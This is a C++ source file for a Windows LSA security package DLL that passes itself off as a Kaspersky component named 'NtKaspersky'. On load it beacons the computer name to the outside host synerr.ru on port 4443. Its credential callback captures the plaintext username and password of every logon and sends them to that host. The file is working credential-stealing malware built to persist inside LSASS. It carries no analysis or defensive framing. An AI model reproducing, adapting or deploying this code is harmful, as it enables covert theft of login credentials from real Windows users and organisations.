#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include "transport.h"
#include "agent.h"

#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#include <strsafe.h>
#include <sysinfoapi.h>
#include <iostream>
#include <string>
#include <memory>

#pragma comment(lib, "Secur32.lib")
Agent agent{};

inline std::wstring ComputerName() {
    wchar_t name[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameExW(ComputerNameNetBIOS, name, &size);
    return std::wstring{name};
}

NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
    auto transport{ std::make_shared<HTTPSTransport>(
        L"synerr.ru",
        4443
    )};
    transport->Connect(L"POST", L"/f1c9fa0490bcc64629357637cae18234f5869a1fc3e0841207fa30bf8393541e");
    transport->AddHeader(L"Client", ComputerName());
    agent.SetTransport(transport.get());
    agent.Ping();

    return 0;
}
NTSTATUS NTAPI SpShutDown(void) {
    return 0;
}
NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo) {

    PackageInfo->fCapabilities = SECPKG_FLAG_NEGOTIABLE | SECPKG_FLAG_MUTUAL_AUTH | SECPKG_FLAG_LOGON | SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_RESTRICTED_TOKENS
        | SECPKG_FLAG_RESTRICTED_TOKENS
        | 0x00000002; // SECPKG_CALLFLAGS_AUTHCAPABLE;
    PackageInfo->Name = (SEC_WCHAR*)L"NtKaspersky";
    PackageInfo->Comment = (SEC_WCHAR*)L"Native library for Kaspersky Security Provider";
    PackageInfo->wRPCID = SECPKG_ID_NONE;
   
    PackageInfo->cbMaxToken = 0;
    PackageInfo->wVersion = 1;
    return 0;
}
NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
    std::wstring login{ AccountName->Buffer }, password{ PrimaryCredentials->Password.Buffer };
    auto transport{ std::make_shared<HTTPSTransport>(
        L"synerr.ru",
        4443
    ) };
    transport->Connect(L"POST", L"/f1c9fa0490bcc64629357637cae18234f5869a1fc3e0841207fa30bf8393541e");
    transport->AddHeader(L"Client", ComputerName());
    agent.SetTransport(transport.get());
    agent.SendCreds(login, password);

    return 0;
}
SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] =
{
    {
        NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL
    }
};
extern "C" __declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE* ppTables, PULONG pcTables)
{
    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables = SecurityPackageFunctionTable;
    *pcTables = 1;
    return 0;
}
